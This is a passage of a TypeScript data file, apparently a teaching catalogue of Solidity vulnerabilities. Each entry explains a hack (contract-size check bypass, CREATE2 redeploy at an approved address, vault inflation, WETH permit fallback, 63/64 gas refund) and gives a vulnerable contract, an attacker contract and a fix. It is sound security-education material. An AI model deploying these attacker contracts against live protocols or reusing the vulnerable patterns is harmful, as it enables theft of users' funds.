        public view returns (bytes32) {
        return keccak256(
            abi.encode(address(this), block.chainid, to, amount, nonce));
    }

    function transfer(
        address to, uint256 amount, uint256 nonce, bytes[2] calldata sigs
    ) external {
        bytes32 h = txHash(to, amount, nonce);
        require(!executed[h], "already executed");
        executed[h] = true; // effect before the transfer
        bytes32 digest = _ethSigned(h);
        for (uint256 i = 0; i < 2; i++) {
            require(_recover(digest, sigs[i]) == owners[i], "invalid sig");
        }
        (bool sent, ) = to.call{value: amount}("");
        require(sent, "send failed");
    }
}`,
    refs: page('signature-replay', 'Signature Replay'),
  },
  {
    slug: 'contract-size',
    name: 'Bypass Contract Size Check',
    category: 'low-level',
    summary: 'extcodesize returns zero while a constructor is still running, so a contract calls in as if it were an EOA.',
    mechanism:
      'Runtime code is written to an account only when its constructor returns, so extcodesize — and ' +
      'therefore address.code.length and every isContract helper built on them — reports zero for a ' +
      'contract that is still being deployed. An attacker puts the entire exploit in their ' +
      'constructor: the call to the guarded function happens while their own code size is zero, and ' +
      'the check waves them through. The reverse assumption fails too, since an EOA that has ' +
      'delegated its code under EIP-7702 reports a non-zero size.',
    prevention:
      'Do not build security on "is the caller an EOA" — the question is not answerable and it breaks ' +
      'smart-contract wallets and ERC-4337 accounts. Enforce the property you actually care about: ' +
      'per-address limits, an allow-list, a signature, or a one-action-per-block rule. tx.origin == ' +
      'msg.sender is the usual substitute and is itself discouraged for the same reason.',
    vulnerable: `contract Target {
    bool public pwned;

    // extcodesize is 0 for an account whose constructor has not
    // returned yet, so this is not a test for "is a contract".
    function isContract(address account) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function protected() external {
        require(!isContract(msg.sender), "no contracts allowed");
        pwned = true;
    }
}`,
    attacker: `interface ITarget {
    function protected() external;
    function isContract(address account) external view returns (bool);
}

contract Hack {
    bool public seenAsContract;

    // Everything happens in the constructor, before this account has any
    // code, so Target.isContract(address(this)) is false.
    constructor(ITarget target) {
        seenAsContract = target.isContract(address(this));
        target.protected();
    }
}`,
    fixed: `contract Target {
    address public immutable admin;
    mapping(address => bool) public allowed;
    mapping(address => uint256) public lastActionBlock;
    bool public pwned;

    constructor() {
        admin = msg.sender;
    }

    function setAllowed(address who, bool ok) external {
        require(msg.sender == admin, "not admin");
        allowed[who] = ok;
    }

    // Gate on what you can actually verify - who this is, and how often
    // they act - instead of on what kind of account they are.
    function protected() external {
        require(allowed[msg.sender], "not allowed");
        require(lastActionBlock[msg.sender] != block.number, "once a block");
        lastActionBlock[msg.sender] = block.number;
        pwned = true;
    }
}`,
    refs: page('contract-size', 'Bypass Contract Size Check'),
  },
  {
    slug: 'deploy-different-contracts-same-address',
    name: 'Deploy Different Contracts at Same Address',
    category: 'proxy',
    summary: 'An address approved for delegatecall is re-created holding different code, because addresses are derived, not bound.',
    mechanism:
      'A DAO approves a proposal by address and later delegatecalls it. The attacker deploys that ' +
      'proposal from a factory that was itself created with CREATE2, so the factory’s address ' +
      'depends only on (deployer, salt, initcode) and the proposal’s address only on (factory, ' +
      'factory nonce). After approval lands, they selfdestruct both, redeploy the factory at the ' +
      'identical CREATE2 address with its nonce back at one, and have it create a different contract — ' +
      'which lands on the address the DAO already blessed. Executing the approved proposal now runs ' +
      'attacker code against the DAO’s storage. EIP-6780 (Cancun) limits selfdestruct to clearing ' +
      'an account only within the transaction that created it, which closes this route on updated ' +
      'chains; the lesson that an address is not an identity does not expire.',
    prevention:
      'Approve code, not addresses: record the target’s runtime codehash when the proposal is ' +
      'approved and re-check target.codehash at execution. Better still, do not delegatecall targets ' +
      'that governance supplies at all — keep executable logic behind an audited, timelocked upgrade ' +
      'path instead.',
    vulnerable: `contract DAO {
    struct Proposal { address target; bool approved; bool executed; }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");
        proposals.push(Proposal(target, true, false));
    }

    // The address was reviewed. The code at it was not re-checked.
    function execute(uint256 id) external {
        Proposal storage p = proposals[id];
        require(p.approved && !p.executed, "not executable");
        p.executed = true;
        (bool ok, ) = p.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);
    function executeProposal() external {
        emit Log("code the DAO approved");
    }
}`,
    attacker: `contract Evil {
    address public owner;
    function executeProposal() external {
        owner = msg.sender; // runs against the DAO's storage
    }
}

contract Deployer {
    // Both use CREATE, so the address depends only on this contract's
    // address and its nonce. A fresh Deployer starts at nonce 1 again.
    function deployProposal() external returns (address) {
        return address(new Proposal()); // from the vulnerable snippet
    }
    function deployEvil() external returns (address) {
        return address(new Evil());
    }

    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}

contract Factory {
    // CREATE2 is deterministic in (this, salt, initcode), so the same
    // salt puts Deployer back at the same address after it is killed.
    function deploy(bytes32 salt) external returns (address) {
        return address(new Deployer{salt: salt}());
    }
}`,
    fixed: `contract DAO {
    struct Proposal { address target; bytes32 codehash; bool executed; }

    address public owner = msg.sender;
    Proposal[] public proposals;

    // Pin the code that was reviewed, not just where it lived.
    function approve(address target) external {
        require(msg.sender == owner, "not authorized");
        require(target.code.length > 0, "no code at target");
        proposals.push(Proposal(target, target.codehash, false));
    }

    function execute(uint256 id) external {
        Proposal storage p = proposals[id];
        require(!p.executed, "executed");
        // Any redeploy at this address changes the code hash.
        require(p.target.codehash == p.codehash, "code changed");
        p.executed = true;
        (bool ok, ) = p.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}`,
    refs: page(
      'deploy-different-contracts-same-address',
      'Deploy Different Contracts at Same Address'
    ),
  },
  {
    slug: 'vault-inflation',
    name: 'Vault Inflation Attack',
    category: 'economic',
    summary: 'A vault that prices shares off its own token balance can be inflated by a direct transfer until the next deposit rounds to zero shares.',
    mechanism:
      'Shares are minted as amount * totalSupply / token.balanceOf(vault), and the denominator is the ' +
      'vault’s live token balance rather than an amount it tracked. The attacker deposits 1 wei to ' +
      'mint exactly one share, then transfers 100e18 tokens straight to the vault — a donation that ' +
      'raises the balance without raising the supply. The victim’s 100e18 deposit now computes ' +
      '100e18 * 1 / (100e18 + 1), which integer division truncates to zero shares, so their tokens are ' +
      'absorbed and the attacker redeems the whole pool against their single share. Done as a ' +
      'front-run of the first real deposit, it costs almost nothing.',
    prevention:
      'Account for assets in a variable the vault increments itself so a raw transfer cannot move the ' +
      'exchange rate, and let the depositor pass a minimum acceptable share count. Remove the empty-' +
      'vault edge case as well — mint dead shares at deployment or use OpenZeppelin ERC-4626, whose ' +
      'decimal offset makes the rounding loss economically pointless.',
    vulnerable: `contract Vault {
    IERC20 public immutable token;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(IERC20 token_) {
        token = token_;
    }

    // The denominator is the live balance, which anyone can raise with a
    // plain transfer, and the division truncates toward zero.
    function deposit(uint256 amount) external {
        uint256 shares = totalSupply == 0
            ? amount
            : (amount * totalSupply) / token.balanceOf(address(this));

        totalSupply += shares;
        balanceOf[msg.sender] += shares;
        token.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 shares) external {
        uint256 amount =
            (shares * token.balanceOf(address(this))) / totalSupply;
        totalSupply -= shares;
        balanceOf[msg.sender] -= shares;
        token.transfer(msg.sender, amount);
    }
}`,
    attacker: `interface IVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

contract Inflator {
    // Run before the victim's deposit is mined.
    function setup(IVault vault, IERC20 token, uint256 donation) external {
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);                       // 1 wei -> 1 share
        token.transfer(address(vault), donation); // rate moves, supply does not
    }

    // The victim's deposit minted 0 shares, so our single share now
    // redeems their tokens as well as our own.
    function collect(IVault vault) external {
        vault.withdraw(1);
    }
}`,
    fixed: `contract Vault {
    IERC20 public immutable token;
    uint256 public totalSupply;
    uint256 public totalAssets; // what we accepted, not what we hold
    mapping(address => uint256) public balanceOf;

    constructor(IERC20 token_) {
        token = token_;
    }

    // Donations cannot move totalAssets; minShares refuses a shifted rate.
    function deposit(uint256 amount, uint256 minShares) external {
        uint256 shares =
            totalAssets == 0 ? amount : (amount * totalSupply) / totalAssets;
        require(shares > 0 && shares >= minShares, "too few shares");
        totalSupply += shares;
        balanceOf[msg.sender] += shares;
        totalAssets += amount;
        token.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 shares) external {
        uint256 amount = (shares * totalAssets) / totalSupply;
        totalSupply -= shares;
        balanceOf[msg.sender] -= shares;
        totalAssets -= amount;
        token.transfer(msg.sender, amount);
    }
}`,
    refs: page('vault-inflation', 'Vault Inflation Attack'),
  },
  {
    slug: 'weth-permit',
    name: 'WETH Permit',
    category: 'low-level',
    summary: 'WETH has no permit function, so a permit call falls through to its payable fallback and returns success without checking any signature.',
    mechanism:
      'A bank offers depositWithPermit, which calls token.permit(owner, ...) and then transferFrom on ' +
      'that owner. WETH implements no permit, but it does have a payable fallback that forwards to ' +
      'deposit — so a call carrying the permit selector reaches the fallback, mints zero WETH because ' +
      'msg.value is zero, and returns without reverting. The bank reads that as a successful approval. ' +
      'Any caller can therefore pass an empty signature, name a victim who once granted the bank an ' +
      'unlimited allowance, move their whole balance in, and credit the deposit to themselves before ' +
      'withdrawing it.',
    prevention:
      'Never let a caller name the account whose allowance is spent: derive the owner from msg.sender. ' +
      'And do not assume an optional extension exists — after calling permit, assert the allowance ' +
      'actually changed, or route approvals through Permit2 instead of the token’s own permit.',
    vulnerable: `contract ERC20Bank {
    IERC20Permit public immutable token;
    mapping(address => uint256) public balanceOf;

    constructor(IERC20Permit token_) {
        token = token_;
    }

    // \`owner\` is chosen by the caller, and \`permit\` is assumed to
    // revert on a bad signature. On WETH it silently hits the fallback.
    function depositWithPermit(
        address owner,
        address recipient,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        token.permit(owner, address(this), amount, deadline, v, r, s);
        token.transferFrom(owner, address(this), amount);
        balanceOf[recipient] += amount;
    }

    function withdraw(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }
}`,
    attacker: `interface IERC20Bank {
    function depositWithPermit(
        address owner,
        address recipient,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function withdraw(uint256 amount) external;
}

contract Steal {
    // The victim once approved the bank for an unlimited amount. The
    // signature arguments are empty and it does not matter.
    function attack(IERC20Bank bank, address victim, uint256 amount)
        external
    {
        bank.depositWithPermit(
            victim, address(this), amount, 0, 0, bytes32(0), bytes32(0)
        );
        bank.withdraw(amount);
    }
}`,
    fixed: `contract ERC20Bank {
    IERC20Permit public immutable token;
    mapping(address => uint256) public balanceOf;

    constructor(IERC20Permit token_) {
        token = token_;
    }

    function depositWithPermit(
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // The depositor is the caller. Nobody can name someone else.
        token.permit(msg.sender, address(this), amount, deadline, v, r, s);
        // A token whose fallback swallowed the call left the allowance
        // untouched, so require that the approval actually happened.
        require(
            token.allowance(msg.sender, address(this)) >= amount,
            "permit had no effect"
        );
        token.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }
}`,
    refs: page('weth-permit', 'WETH Permit'),
  },
  {
    slug: '63-64-gas-rule',
    name: '63 / 64 Gas Rule',
    category: 'low-level',
    summary: 'A call forwards at most 63/64 of the caller’s remaining gas, so measuring "gas used" across the boundary over-counts by the withheld reserve.',
    mechanism:
      'Since EIP-150 the EVM never forwards all remaining gas to an external call: it keeps one ' +
      'sixty-fourth of the caller’s balance behind so the caller can still handle a failure. A ' +
      'refunder that reads gasleft() in the caller, passes it across, and subtracts gasleft() measured ' +
      'in the callee is therefore counting that reserve as consumed. The reserve scales with the gas ' +
      'the caller still held, so an attacker who sends a transaction with the largest gas limit the ' +
      'block allows inflates the phantom figure by hundreds of thousands of gas per call and is paid ' +
      'for work nobody did.',
    prevention:
      'Never treat a gasleft() difference taken across a call boundary as gas actually spent. Subtract ' +
      'the withheld reserve explicitly — gasStart - gasNow - gasNow / 63 bounds it from above — cap ' +
      'the refund at a maximum you are willing to pay, and restrict who may trigger a payout at all.',
    vulnerable: `contract Relayer {
    Refunder public immutable refunder;

    constructor(Refunder refunder_) {
        refunder = refunder_;
    }

    function relay() external {
        refunder.execute(msg.sender, gasleft());
    }
}

contract Refunder {
    mapping(address => bool) public authorized;

    constructor() {
        authorized[msg.sender] = true;
    }

    receive() external payable {}

    function execute(address receiver, uint256 gasStart) external {
        require(authorized[msg.sender], "not authorized");
        // gasStart came from one frame up; 1/64 was never forwarded.
        uint256 gasUsed = gasStart - gasleft();
        (bool ok, ) = receiver.call{value: gasUsed * tx.gasprice}("");
        require(ok, "refund failed");
    }
}`,
    attacker: `interface IRelayer {
    function relay() external;
}

contract GasBloat {
    IRelayer public immutable relayer;

    constructor(IRelayer relayer_) {
        relayer = relayer_;
    }

    receive() external payable {}

    // No cleverness required: send the transaction with the largest gas
    // limit the block allows. The 1/64 the EVM withholds grows with it,
    // and the refunder pays for every unit of it.
    function attack() external {
        relayer.relay();
    }
}`,
    fixed: `contract Refunder {
    uint256 public constant MAX_REFUND_GAS = 500_000;

    mapping(address => bool) public authorized;

    constructor() {
        authorized[msg.sender] = true;
    }

    receive() external payable {}

    function execute(address receiver, uint256 gasStart) external {
        require(authorized[msg.sender], "not authorized");

        uint256 gasNow = gasleft();
        // gasNow <= 63/64 of what the caller held, so gasNow / 63 is at
        // least the withheld 1/64. Subtracting it can only under-refund.
        uint256 gasUsed = gasStart - gasNow - gasNow / 63;
        if (gasUsed > MAX_REFUND_GAS) gasUsed = MAX_REFUND_GAS;

        (bool ok, ) = receiver.call{value: gasUsed * tx.gasprice}("");
        require(ok, "refund failed");
    }
}`,
    refs: page('63-64-gas-rule', '63 / 64 Gas Rule'),
  },
];

export const HACK_COUNT = HACKS.length;
